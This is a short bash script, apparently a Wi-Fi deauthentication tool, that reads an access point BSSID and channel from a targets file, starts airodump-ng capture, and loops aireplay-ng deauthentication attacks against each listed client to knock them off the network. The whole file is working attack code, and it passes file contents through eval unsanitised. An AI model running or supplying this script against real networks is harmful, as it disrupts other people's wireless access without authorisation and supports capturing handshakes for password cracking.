#! /bin/bash
Counter=0
TARGET_BSSID=$(head -n 1 targets.txt)
echo "$TARGET_BSSID"
TARGET_CHANNEL=$(head -n 2 targets.txt | tail -1)
echo "$TARGET_CHANNEL"

#Open new terminal to capture channel
gnome-terminal -e "bash -c \"airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID wlan0; exec bash\""
#gnome-terminal -e `airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID wlan0`

#Loop through text file and deauth all targets
while read line; do
	#Ignore first two lines; already took care of them above
	if [ $Counter -eq 0 ]; then
		echo "TARGET BSSID: $line"
		Counter=`expr $Counter + 1`
	elif [ $Counter -eq 1 ]; then
		echo "Channel: $line"
		Counter=`expr $Counter + 1`
	else
		echo "KICKING: $line off of $TARGET_BSSID"
		eval aireplay-ng -a $TARGET_BSSID --deauth 100 -c $line wlan0
	fi
done < targets.txt
gnome-terminal -e -x bash -c ""

#aireplay-ng --deauth 100 -a [SSID] -c [client] [wifi]
